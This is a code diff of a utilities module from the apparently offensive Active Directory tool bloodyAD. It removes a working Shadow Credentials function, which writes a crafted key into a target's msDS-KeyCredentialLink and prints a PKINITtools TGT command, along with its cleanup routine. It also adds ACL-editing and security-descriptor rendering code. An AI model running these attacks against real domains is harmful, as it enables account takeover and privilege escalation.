@@ -1,13 +1,13 @@
-from bloodyAD.formatters import ldaptypes, accesscontrol, cryptography, common
-from bloodyAD.exceptions import NoResultError, ResultError, TooManyResultsError
-import random, string, logging, json, sys, datetime, binascii, types, base64
-from functools import lru_cache
+from bloodyAD.formatters import (
+    ldaptypes,
+    accesscontrol,
+    adschema,
+)
+import logging, json, sys, types, base64
 import ldap3
-from ldap3.protocol.formatters.formatters import format_sid
-from cryptography import x509
-from cryptography.x509.oid import NameOID
-from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.primitives.asymmetric import rsa
+from winacl import dtyp
+from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
+from pyasn1.type import namedtype, univ
 
 
 LOG = logging.getLogger("bloodyAD")
@@ -17,236 +17,19 @@ handler.setLevel(logging.DEBUG)
 LOG.addHandler(handler)
 
 
-def resolvDN(conn, identity, objtype=None):
-    """
-    Return the DN for the object based on the parameters identity
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the user
-        objtype: None is default or GPO
-    """
-
-    if "dc=" in identity.lower():
-        # identity is a DN, return as is
-        # We do not try to validate it because it could be from another trusted domain
-        return identity
-
-    if "s-1-" in identity.lower():
-        # We assume identity is an SID
-        ldap_filter = f"(objectSid={identity})"
-
-    elif "{" in identity:
-        if objtype == "GPO":
-            ldap_filter = f"(&(objectClass=groupPolicyContainer)(name={identity}))"
-        else:
-            # We assume identity is a GUID
-            ldap_filter = f"(objectGUID={identity})"
-    else:
-        # By default, we assume identity is a sam account name
-        ldap_filter = f"(sAMAccountName={identity})"
-
-    naming_context = getDefaultNamingContext(conn)
-    conn.search(naming_context, ldap_filter)
-
-    entries = [e for e in conn.response if e.get("type", "") == "searchResEntry"]
-
-    if len(entries) < 1:
-        raise NoResultError(naming_context, ldap_filter)
-
-    if len(entries) > 1:
-        raise TooManyResultsError(naming_context, ldap_filter, entries)
-
-    res = entries[0]["dn"]
-    return res
-
-
-def renderSearchResult(entries):
-    """
-    Take entries of type Iterator({dn: <list/generator with one depth or primitive type or raw bytes>},{...}...)
-    Returns entries as is but with base64 instead of raw bytes if not decodable in utf-8
-    """
-    decoded_entry = {}
-    for entry in entries:
-        for attr_name, attr_members in entry.items():
-            if type(attr_members) in [list, types.GeneratorType]:
-                decoded_entry[attr_name] = []
-                for member in attr_members:
-                    if type(member) == bytes:
-                        try:
-                            decoded = member.decode()
-                        except UnicodeDecodeError:
-                            decoded = base64.b64encode(member).decode()
-                    else:
-                        decoded = member
-                    decoded_entry[attr_name].append(decoded)
-            else:
-                if type(attr_members) == bytes:
-                    try:
-                        decoded = attr_members.decode()
-                    except UnicodeDecodeError:
-                        decoded = base64.b64encode(attr_members).decode()
-                else:
-                    decoded = attr_members
-                decoded_entry[attr_name] = decoded
-        yield decoded_entry
-        decoded_entry = {}
-
-
-def search(
-    conn,
-    base,
-    ldap_filter="(objectClass=*)",
-    search_scope=ldap3.BASE,
-    attr=["*"],
-    control_flag=(
-        accesscontrol.OWNER_SECURITY_INFORMATION
-        + accesscontrol.GROUP_SECURITY_INFORMATION
-        + accesscontrol.DACL_SECURITY_INFORMATION
-    ),
-):
-    ldap_conn = conn.getLdapConnection()
-    base_dn = resolvDN(ldap_conn, base)
-    controls = ldap3.protocol.microsoft.security_descriptor_control(
-        sdflags=control_flag
-    )
-    ldap_conn.search(
-        base_dn,
-        ldap_filter,
-        search_scope=search_scope,
-        attributes=attr,
-        controls=controls,
-    )
-    if len(ldap_conn.entries) < 1:
-        raise NoResultError(base_dn, ldap_filter)
-
-    return ldap_conn.response
-
-
-def setAttr(
-    conn,
-    identity,
-    attribute,
-    value,
-    control_flag=accesscontrol.OWNER_SECURITY_INFORMATION,
-):
-    ldap_conn = conn.getLdapConnection()
-    dn = resolvDN(ldap_conn, identity)
-    controls = ldap3.protocol.microsoft.security_descriptor_control(
-        sdflags=control_flag
-    )
-    ldap_conn.modify(dn, {attribute: [ldap3.MODIFY_REPLACE, value]}, controls)
-
-    if ldap_conn.result["result"] == 0:
-        LOG.debug(f"[+] {attribute} set successfully")
-    else:
-        raise ResultError(conn.result)
-
-
-def getDefaultNamingContext(conn):
-    naming_context = conn.server.info.other["defaultNamingContext"][0]
-    return naming_context
-
-
-def getOrganizationalUnits(conn, attributes=["*"], page_size=1000):
-    """
-    Iterator over the Organizational Units
-    """
-    ldap_conn = conn.getLdapConnection()
-    naming_context = getDefaultNamingContext(ldap_conn)
-
-    control_flag = (
-        accesscontrol.OWNER_SECURITY_INFORMATION
-        + accesscontrol.GROUP_SECURITY_INFORMATION
-        + accesscontrol.DACL_SECURITY_INFORMATION
-    )
-    controls = ldap3.protocol.microsoft.security_descriptor_control(
-        sdflags=control_flag
-    )
-
-    ldap_conn.search(
-        search_base=naming_context,
-        search_filter="(objectClass=OrganizationalUnit)",
-        search_scope=ldap3.SUBTREE,
-        attributes=attributes,
-        paged_size=page_size,
-        controls=controls,
-    )
-
-    cookie = ldap_conn.result["controls"]["1.2.840.113556.1.4.319"]["value"]["cookie"]
-
-    ous = [e for e in ldap_conn.response if e.get("type", "") == "searchResEntry"]
-
-    for ou in ous:
-        yield ou
-
-    while cookie:
-        ldap_conn.search(
-            search_base=naming_context,
-            search_filter="(objectClass=OrganizationalUnit)",
-            search_scope=ldap3.SUBTREE,
-            attributes=attributes,
-            paged_size=page_size,
-            paged_cookie=cookie,
-            controls=controls,
-        )
-
-        cookie = ldap_conn.result["controls"]["1.2.840.113556.1.4.319"]["value"][
-            "cookie"
-        ]
-
-        ous = [e for e in ldap_conn.response if e.get("type", "") == "searchResEntry"]
-        for ou in ous:
-            yield ou
-
-
-@lru_cache
-def getObjectSID(conn, identity):
-    """
-    Get the SID for the given identity
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the object
-    """
-    ldap_conn = conn.getLdapConnection()
-    object_dn = resolvDN(ldap_conn, identity)
-    ldap_conn.search(
-        object_dn,
-        "(objectClass=*)",
-        search_scope=ldap3.BASE,
-        attributes="objectSid",
-    )
-    object_sid = ldap_conn.response[0]["raw_attributes"]["objectSid"][0]
-    LOG.debug(f"[*] {identity} SID is: {format_sid(object_sid)}")
-    return object_sid
-
-
-def getSD(
-    conn,
-    object_id,
-    ldap_attribute="nTSecurityDescriptor",
-    control_flag=accesscontrol.DACL_SECURITY_INFORMATION,
-):
-    entry = search(conn, object_id, attr=ldap_attribute, control_flag=control_flag)[0]
-    sd_data = entry["raw_attributes"][ldap_attribute]
-    if len(sd_data) < 1:
-        LOG.warning(
-            "[!] No security descriptor has been returned, a new one will be created"
-        )
-        sd = accesscontrol.createEmptySD()
-    else:
-        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])
-
-    return sd, sd_data
-
-
 def addRight(
     sd,
     user_sid,
     access_mask=accesscontrol.ACCESS_FLAGS["FULL_CONTROL"],
     object_type=None,
 ):
+    user_sid = dtyp.sid.SID.from_string(user_sid)
     user_aces = [
-        ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].getData() == user_sid
+        ace
+        for ace in sd["Dacl"].aces
+        if ace["Ace"]["Sid"].getData() == user_sid.to_bytes()
     ]
-    new_ace = accesscontrol.createACE(user_sid, object_type, access_mask)
+    new_ace = accesscontrol.createACE(user_sid.to_bytes(), object_type, access_mask)
     if object_type:
         access_denied_type = ldaptypes.ACCESS_DENIED_OBJECT_ACE.ACE_TYPE
     else:
@@ -283,8 +66,11 @@ def delRight(
     object_type=None,
 ):
     isRemoved = False
+    user_sid = dtyp.sid.SID.from_string(user_sid)
     user_aces = [
-        ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].getData() == user_sid
+        ace
+        for ace in sd["Dacl"].aces
+        if ace["Ace"]["Sid"].getData() == user_sid.to_bytes()
     ]
     if object_type:
         access_allowed_type = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
@@ -305,128 +91,443 @@ def delRight(
     return isRemoved
 
 
-def addShadowCredentials(conn, identity, outfilePath=None):
-    """
-    Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
-        outfilePath: file path for the generated certificate (default is current path)
-    """
-    ldap_conn = conn.getLdapConnection()
-    target_dn = resolvDN(ldap_conn, identity)
-
-    LOG.debug("Generating certificate")
-
-    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-    issuer = x509.Name(
-        [
-            x509.NameAttribute(NameOID.COMMON_NAME, target_dn),
-        ]
-    )
-    cert = (
-        x509.CertificateBuilder()
-        .subject_name(issuer)
-        .issuer_name(issuer)
-        .serial_number(x509.random_serial_number())
-        .public_key(key.public_key())
-        .not_valid_before(datetime.datetime.utcnow())
-        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
-        .sign(key, hashes.SHA256())
-    )
-
-    LOG.debug("Certificate generated")
-    LOG.debug("Generating KeyCredential")
-
-    keyCredential = cryptography.KEYCREDENTIALLINK_BLOB()
-    keyCredential.keyCredentialLink_from_x509(cert)
-
-    LOG.info(
-        "[+] KeyCredential generated with following sha256 of RSA key: %s"
-        % binascii.hexlify(keyCredential.getKeyID()).decode()
-    )
-
-    ldap_conn.search(
-        target_dn,
-        "(objectClass=*)",
-        search_scope=ldap3.BASE,
-        attributes=["msDS-KeyCredentialLink"],
-    )
-
-    key_dnbinary = common.DNBinary()
-    key_dnbinary.fromCanonical(keyCredential.getData(), target_dn)
-    new_values = ldap_conn.response[0]["raw_attributes"]["msDS-KeyCredentialLink"] + [
-        str(key_dnbinary)
-    ]
-
-    LOG.debug("[*] Updating the msDS-KeyCredentialLink attribute of %s" % identity)
-
-    ldap_conn.modify(
-        target_dn,
-        {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, new_values]},
-    )
-
-    if ldap_conn.result["result"] == 0:
-        LOG.debug("[+] msDS-KeyCredentialLink attribute of the target object updated")
-        if outfilePath is None:
-            path = "".join(
-                random.choice(string.ascii_letters + string.digits) for i in range(8)
-            )
-            LOG.info(
-                "No outfile path was provided. The certificate(s) will be"
-                " stored with the filename: %s" % path
-            )
-        else:
-            path = outfilePath
-
-        key_path = path + "_priv.pem"
-        with open(key_path, "wb") as f:
-            f.write(
-                key.private_bytes(
-                    serialization.Encoding.PEM,
-                    serialization.PrivateFormat.TraditionalOpenSSL,
-                    serialization.NoEncryption(),
-                )
-            )
-        cert_path = path + "_cert.pem"
-        with open(cert_path, "wb") as f:
-            f.write(cert.public_bytes(serialization.Encoding.PEM))
-
-        LOG.info("[+] Saved PEM certificate at path: %s" % cert_path)
-        LOG.info("[+] Saved PEM private key at path: %s" % key_path)
-        LOG.info(
-            "A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools"
+def getSD(
+    conn,
+    object_id,
+    ldap_attribute="nTSecurityDescriptor",
+    control_flag=accesscontrol.DACL_SECURITY_INFORMATION,
+):
+    sd_data = next(
+        conn.ldap.bloodysearch(
+            object_id, attr=ldap_attribute, control_flag=control_flag, raw=True
         )
-        LOG.info("Run the following command to obtain a TGT:")
-        LOG.info(
-            "python3 PKINITtools/gettgtpkinit.py -cert-pem %s"
-            " -key-pem %s %s/%s %s.ccache"
-            % (cert_path, key_path, conn.conf.domain, identity, path)
+    )[ldap_attribute]
+    if len(sd_data) < 1:
+        LOG.warning(
+            "[!] No security descriptor has been returned, a new one will be created"
         )
-
+        sd = accesscontrol.createEmptySD()
     else:
-        raise ResultError(ldap_conn.result)
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])
+
+    LOG.debug(
+        "[*] Old Security Descriptor: "
+        + "\t".join([SECURITY_DESCRIPTOR.from_bytes(sd).to_sddl() for sd in sd_data])
+    )
+    return sd, sd_data
 
 
-def delShadowCredentials(conn, identity, rsakey_sha256):
-    """
-    Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCredentialLink attribute of the user provided
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
-    """
-    attr = "msDS-KeyCredentialLink"
-    keyCreds = search(conn, identity, attr=attr)[0]["raw_attributes"][attr]
-    newKeyCreds = []
-    isFound = False
-    for keyCred in keyCreds:
-        key_raw = common.DNBinary(keyCred).value
-        key_blob = cryptography.KEYCREDENTIALLINK_BLOB(key_raw)
-        if rsakey_sha256 and key_blob.getKeyID() != binascii.unhexlify(rsakey_sha256):
-            newKeyCreds.append(keyCred)
+# First elt in grouping order is the first grouping criterium
+def groupBy(rows, grouping_order):
+    try:
+        grouping_key = grouping_order.pop()
+        merged = groupBy(rows, grouping_order)
+    except IndexError:  # We exhausted all grouping criteriums
+        return rows
+
+    new_merge = []
+    for row in merged:
+        isMergeable = False
+        for new_row in new_merge:
+            isMergeable = True
+            for k in row:
+                if k == grouping_key:
+                    continue
+                try:
+                    if row[k] != new_row[k]:
+                        isMergeable = False
+                        break
+                except (
+                    KeyError
+                ):  # If one of the rows doesn't have the non grouping property, it can't be merged
+                    continue
+            if isMergeable:
+                new_row[grouping_key] |= row[grouping_key]
+                break
+        if not isMergeable:
+            new_merge.append(row)
+    return new_merge
+
+
+ACCESS_RIGHTS = {
+    "CREATE_CHILD": (0x1,),
+    "DELETE_CHILD": (0x2,),
+    "LIST_CHILD": (0x4,),  # LIST_CONTENTS
+    "WRITE_VALIDATED": (0x8,),  # WRITE_PROPERTY_EXTENDED
+    "READ_PROP": (0x10,),
+    "WRITE_PROP": (0x20,),  # Does it contains WRITE VALIDATED?
+    "DELETE_TREE": (0x40,),
+    "LIST_OBJECT": (0x80,),
+    "CONTROL_ACCESS": (0x100,),
+    "DELETE": (0x10000,),
+    "READ_SD": (0x20000,),
+    "WRITE_DACL": (0x40000,),
+    "WRITE_OWNER": (0x80000,),
+    "ACCESS_SYSTEM_SECURITY": (0x1000000,),
+    "SYNCHRONIZE": (0x100000,),
+}
+ACCESS_RIGHTS["GENERIC_EXECUTE"] = (
+    0x20000000,
+    ACCESS_RIGHTS["READ_SD"][0] | ACCESS_RIGHTS["LIST_CHILD"][0],
+)
+ACCESS_RIGHTS["GENERIC_WRITE"] = (
+    0x40000000,
+    ACCESS_RIGHTS["READ_SD"][0]
+    | ACCESS_RIGHTS["WRITE_PROP"][0]
+    | ACCESS_RIGHTS["WRITE_VALIDATED"][0],
+)
+ACCESS_RIGHTS["GENERIC_READ"] = (
+    0x80000000,
+    ACCESS_RIGHTS["READ_SD"][0]
+    | ACCESS_RIGHTS["READ_PROP"][0]
+    | ACCESS_RIGHTS["LIST_CHILD"][0]
+    | ACCESS_RIGHTS["LIST_OBJECT"][0],
+)
+ACCESS_RIGHTS["GENERIC_ALL"] = (
+    0x10000000,
+    ACCESS_RIGHTS["GENERIC_EXECUTE"][0]
+    | ACCESS_RIGHTS["GENERIC_WRITE"][0]
+    | ACCESS_RIGHTS["GENERIC_READ"][0]
+    | ACCESS_RIGHTS["DELETE"][0]
+    | ACCESS_RIGHTS["DELETE_TREE"][0]
+    | ACCESS_RIGHTS["CONTROL_ACCESS"][0]
+    | ACCESS_RIGHTS["CREATE_CHILD"][0]
+    | ACCESS_RIGHTS["DELETE_CHILD"][0]
+    | ACCESS_RIGHTS["WRITE_DACL"][0]
+    | ACCESS_RIGHTS["WRITE_OWNER"][0],
+    ACCESS_RIGHTS["READ_SD"][0]
+    | ACCESS_RIGHTS["READ_PROP"][0]
+    | ACCESS_RIGHTS["LIST_CHILD"][0]
+    | ACCESS_RIGHTS["LIST_OBJECT"][0]
+    | ACCESS_RIGHTS["WRITE_PROP"][0]
+    | ACCESS_RIGHTS["WRITE_VALIDATED"][0]
+    | ACCESS_RIGHTS["DELETE"][0]
+    | ACCESS_RIGHTS["DELETE_TREE"][0]
+    | ACCESS_RIGHTS["CONTROL_ACCESS"][0]
+    | ACCESS_RIGHTS["CREATE_CHILD"][0]
+    | ACCESS_RIGHTS["DELETE_CHILD"][0]
+    | ACCESS_RIGHTS["WRITE_DACL"][0]
+    | ACCESS_RIGHTS["WRITE_OWNER"][0],
+)
+# Reverse is sorted for mask operations
+REVERSE_ACCESS_RIGHTS = dict(
+    sorted(
+        [
+            (mask, flag)
+            for flag, masktuple in ACCESS_RIGHTS.items()
+            for mask in masktuple
+        ],
+        reverse=True,
+    )
+)
+
+
+class Right:
+    def __init__(self, mask):
+        self.mask = mask
+
+    def __str__(self):
+        flag_list = []
+        tmp_mask = self.mask
+        for key_mask in REVERSE_ACCESS_RIGHTS:
+            if (
+                key_mask & ~tmp_mask
+            ) > 0:  # Means key_mask is including bits not in tmp_mask
+                continue
+            remainder = (
+                tmp_mask & ~key_mask
+            )  # We keep a remainder of tmp_mask with complement of key_mask if tmp_mask is bigger than key_mask
+            flag_list.append(REVERSE_ACCESS_RIGHTS[key_mask])
+            tmp_mask = remainder
+            if remainder == 0:
+                break
+        if tmp_mask != 0:  # If there is unknown mask
+            flag_list.append(str(tmp_mask))
+        return "|".join(flag_list)
+
+
+class Control:
+    def __init__(self, control_enum):
+        self.control_enum = control_enum
+
+    def __str__(self):
+        flag_str = str(self.control_enum).split(".")[1]
+        flag_str = flag_str.replace("SE_", "")
+        return flag_str
+
+
+class AceType:
+    def __init__(self, acetype_enum):
+        self.acetype_enum = acetype_enum
+
+    def __eq__(self, o):
+        if not isinstance(o, AceType):
+            return NotImplemented
+        return self.acetype_enum == o.acetype_enum
+
+    def __str__(self):
+        flag_str = str(self.acetype_enum).split(".")[1]
+        flag_str = flag_str.replace("ACCESS_", "")
+        flag_str = flag_str.replace("SYSTEM_", "")
+        flag_str = flag_str.replace("_ACE_TYPE", "")
+        return f"== {flag_str} =="
+
+
+class AceFlag:
+    def __init__(self, aceflag_enum):
+        self.aceflag_enum = aceflag_enum
+
+    def __str__(self):
+        flag_str = str(self.aceflag_enum).split(".")[1]
+        flag_str = flag_str.replace("_ACE_FLAG", "")
+        flag_str = flag_str.replace("_ACE", "")
+        return flag_str
+
+
+class LazyAdSchema:
+    guids = set()
+    sids = set()
+    guid_dict = adschema.OBJECT_TYPES | {
+        "Self": "Self"
+    }  # Special object to design rule applies to self
+    sid_dict = dtyp.sid.well_known_sids_sid_name_map
+    isResolved = False
+
+    def _resolveAll(self):
+        if self.isResolved:
+            return
+
+        # WARNING: only 512 filters max per request
+        filters = []
+        buffer_filter = ""
+        filter_nb = 0
+        for sid in self.sids:
+            if filter_nb > 511:
+                filters.append(buffer_filter)
+                buffer_filter = ""
+                filter_nb = 0
+            buffer_filter += f"(objectSid={sid})"
+            filter_nb += 1
+        for guid in self.guids:
+            if filter_nb > 511:
+                filters.append(buffer_filter)
+                buffer_filter = ""
+                filter_nb = 0
+            guid_bin_str = "\\" + "\\".join(
+                [
+                    "{:02x}".format(b)
+                    for b in dtyp.guid.GUID().from_string(guid).to_bytes()
+                ]
+            )
+            buffer_filter += f"(rightsGuid={str(guid)})(schemaIDGUID={guid_bin_str})"
+            filter_nb += 2
+        filters.append(buffer_filter)
+
+        # Search in all non application partitions
+        # TODO: search in GC and add domain linked to it as DOMAIN\sAMAccountName, maybe try trusts in the future?
+        class SearchOptionsRequest(univ.Sequence):
+            componentType = namedtype.NamedTypes(
+                namedtype.NamedType("Flags", univ.Integer())
+            )
+
+        scontrols = SearchOptionsRequest()
+        SERVER_SEARCH_FLAG_PHANTOM_ROOT = 2
+        scontrols.setComponentByName("Flags", SERVER_SEARCH_FLAG_PHANTOM_ROOT)
+        LDAP_SERVER_SEARCH_OPTIONS_OID = "1.2.840.113556.1.4.1340"
+        controls = [
+            ldap3.protocol.controls.build_control(
+                LDAP_SERVER_SEARCH_OPTIONS_OID, False, scontrols
+            )
+        ]
+        for ldap_filter in filters:
+            entries = self.conn.ldap.bloodysearch(
+                "",
+                ldap_filter=f"(|{ldap_filter})",
+                attr=[
+                    "name",
+                    "sAMAccountName",
+                    "objectSid",
+                    "rightsGuid",
+                    "schemaIDGUID",
+                ],
+                search_scope=ldap3.SUBTREE,
+                controls=controls,
+            )
+            for entry in entries:
+                if entry["objectSid"]:
+                    self.sid_dict[entry["objectSid"]] = (
+                        entry["sAMAccountName"]
+                        if entry["sAMAccountName"]
+                        else entry["name"]
+                    )
+                else:
+                    if entry["rightsGuid"]:
+                        key = entry["rightsGuid"]
+                    elif entry["schemaIDGUID"]:
+                        key = entry["schemaIDGUID"][
+                            1:-1
+                        ]  # Removes brackets for GUID formatted with ldap3 format_uuid_le
+                    else:
+                        LOG.warning(f"[!] No guid/sid returned for {entry}")
+                        continue
+                    self.guid_dict[key] = entry["name"]
+        # Cleanup resolved ids from queues
+        self.isResolved = True
+        self.guids = set()
+        self.sids = set()
+
+    def addguid(self, guid):
+        # Should not add in set to resolve after if it is already resolved
+        if guid not in self.guid_dict:
+            self.guids.add(guid)
+
+    def addsid(self, sid):
+        if sid not in self.sid_dict:
+            self.sids.add(sid)
+
+    def getguid(self, guid):
+        try:
+            return self.guid_dict[guid]
+        except KeyError:
+            if not self.isResolved:
+                self._resolveAll()
+                return self.getguid(guid)
+            else:
+                return guid
+
+    def getsid(self, sid):
+        try:
+            return self.sid_dict[sid]
+        except KeyError:
+            if not self.isResolved:
+                self._resolveAll()
+                return self.getsid(sid)
+            else:
+                return sid
+
+
+global_lazy_adschema = LazyAdSchema()
+
+
+class LazyGuid:
+    def __init__(self, guid):
+        self.guid = guid
+        global_lazy_adschema.addguid(guid)
+
+    def __str__(self):
+        return global_lazy_adschema.getguid(self.guid)
+
+
+class LazySid:
+    def __init__(self, sid):
+        self.sid = sid
+        global_lazy_adschema.addsid(sid)
+
+    def __str__(self):
+        return global_lazy_adschema.getsid(self.sid)
+
+
+def aceFactory(k, a):
+    if k == "Trustee":
+        return {k: LazySid(a)}
+    elif k == "Right":
+        return {k: Right(a)}
+    elif k == "ObjectType":
+        return {k: LazyGuid(a)}
+    elif k == "InheritedObjectType":
+        return {k: LazyGuid(a)}
+    elif k == "Flags":
+        return {k: AceFlag(a)}
+    else:
+        return {k: a}
+
+
+def renderSD(sddl, conn):
+    global_lazy_adschema.conn = conn
+    sd = SECURITY_DESCRIPTOR.from_sddl(sddl)
+    # We don't print Revision because it's always 1,
+    # Group isn't used in ADDS
+    renderedSD = {"Owner": LazySid(str(sd.Owner)), "Control": Control(sd.Control)}
+    rendered_aces = []
+    allAces = []
+    if sd.Dacl:
+        allAces += sd.Dacl.aces
+    if sd.Sacl:
+        allAces += sd.Sacl.aces
+    for ace in allAces:
+        rendered_ace = {
+            "Type": AceType(ace.AceType),
+            "Trustee": set([str(ace.Sid)]),
+            "Right": ace.Mask,
+            "ObjectType": set(),
+            "InheritedObjectType": set(),
+            "Flags": ace.AceFlags,
+        }
+
+        if hasattr(ace, "ObjectType") and ace.ObjectType:
+            object_guid_str = str(ace.ObjectType)
         else:
-            isFound = True
-            LOG.debug("[*] Key to delete found")
+            object_guid_str = "Self"
+        rendered_ace["ObjectType"].add(object_guid_str)
+        if hasattr(ace, "InheritedObjectType") and ace.InheritedObjectType:
+            rendered_ace["InheritedObjectType"].add(str(ace.InheritedObjectType))
 
-    if not isFound:
-        LOG.warning("[!] No key found")
+        rendered_aces.append(rendered_ace)
 
-    setAttr(conn, identity, attr, newKeyCreds)
+    grouped_aces = groupBy(
+        rendered_aces,
+        ["ObjectType", "Trustee", "Flags", "InheritedObjectType", "Right"],
+    )
+    typed_aces = []
+    for ace in grouped_aces:
+        typed_ace = {}
+        for k, v in ace.items():
+            if not v:
+                continue
+            try:
+                for a in v:  # If it's a set of guids/sids
+                    typed_ace |= aceFactory(k, a)
+            except TypeError:  # If it's a mask
+                typed_ace |= aceFactory(k, v)
+
+        typed_aces.append(typed_ace)
+    renderedSD["ACL"] = typed_aces
+
+    return renderedSD
+
+
+def renderSearchResult(entries):
+    """
+    Takes entries of type Iterator({dn: <list/generator with one depth or primitive type or raw bytes>},{...}...)
+    Returns entries as is but with base64 instead of raw bytes if not decodable in utf-8
+    Sorts entry alphabetically too
+    """
+    decoded_entry = {}
+    for entry in entries:
+        entry = {
+            **{"distinguishedName": entry["distinguishedName"]},
+            **{k: v for k, v in sorted(entry.items()) if k != "distinguishedName"},
+        }
+        for attr_name, attr_members in entry.items():
+            if type(attr_members) in [list, types.GeneratorType]:
+                decoded_entry[attr_name] = []
+                for member in attr_members:
+                    if type(member) == bytes:
+                        try:
+                            decoded = member.decode()
+                        except UnicodeDecodeError:
+                            decoded = base64.b64encode(member).decode()
+                    else:
+                        decoded = member
+                    decoded_entry[attr_name].append(decoded)
+            else:
+                if type(attr_members) == bytes:
+                    try:
+                        decoded = attr_members.decode()
+                    except UnicodeDecodeError:
+                        decoded = base64.b64encode(attr_members).decode()
+                else:
+                    decoded = attr_members
+                decoded_entry[attr_name] = decoded
+        yield decoded_entry
+        decoded_entry = {}
